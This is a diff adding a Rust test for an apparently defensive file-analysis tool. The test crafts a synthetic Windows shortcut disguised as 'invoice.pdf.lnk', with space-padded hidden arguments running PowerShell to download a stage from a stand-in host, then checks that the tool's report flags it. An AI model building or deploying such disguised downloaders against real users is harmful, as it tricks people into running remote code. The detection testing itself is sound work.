@@ -316,3 +316,59 @@ fn exports_must_contain_observables_only_and_never_redacted_secrets() {
     assert!(csv.starts_with("type,value,occurrences,source\n"));
     assert!(csv.contains("\nmd5,44d88612fea8a8f36de82e1f4d6c1b0f,1,sample.log\n"));
 }
+
+#[test]
+fn shortcut_reports_surface_hidden_arguments_and_their_indicators() {
+    let f = Fixture::new("lnk-report");
+    let utf16 = |value: &str| {
+        let units = value.encode_utf16().collect::<Vec<_>>();
+        let mut output = (units.len() as u16).to_le_bytes().to_vec();
+        output.extend(units.iter().flat_map(|unit| unit.to_le_bytes()));
+        output
+    };
+    // Synthetic shortcut: HasArguments | IsUnicode, arguments padded with spaces.
+    let mut shortcut = vec![0_u8; 0x4C];
+    shortcut[..4].copy_from_slice(&0x4C_u32.to_le_bytes());
+    shortcut[4..20].copy_from_slice(&[
+        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x46,
+    ]);
+    shortcut[0x14..0x18].copy_from_slice(&(0x20_u32 | 0x80).to_le_bytes());
+    shortcut.extend(utf16(&format!(
+        "{}/c powershell -nop -c iwr http://hidden.example.test/stage",
+        " ".repeat(64)
+    )));
+    let path = f.0.join("invoice.pdf.lnk");
+    std::fs::write(&path, &shortcut).unwrap();
+
+    let output = Command::cargo_bin("banshee")
+        .unwrap()
+        .arg("report")
+        .arg(&path)
+        .args(["--format", "json"])
+        .output()
+        .unwrap();
+    assert!(output.status.success(), "{output:?}");
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["file"]["format"], "Windows shortcut (LNK)");
+    let findings = report["file"]["findings"].to_string();
+    assert!(
+        findings.contains("start with 64 whitespace characters"),
+        "{findings}"
+    );
+    assert!(findings.contains("powershell"), "{findings}");
+    let iocs = report["content_analysis"]["report"]["iocs"]["iocs"]
+        .as_array()
+        .unwrap();
+    let url = iocs
+        .iter()
+        .find(|ioc| ioc["value"] == "http://hidden.example.test/stage")
+        .expect("argument URL becomes an indicator");
+    assert!(
+        url["source"]
+            .as_str()
+            .unwrap()
+            .ends_with("(document metadata)")
+    );
+    assert!(url["first_line"].is_null());
+}
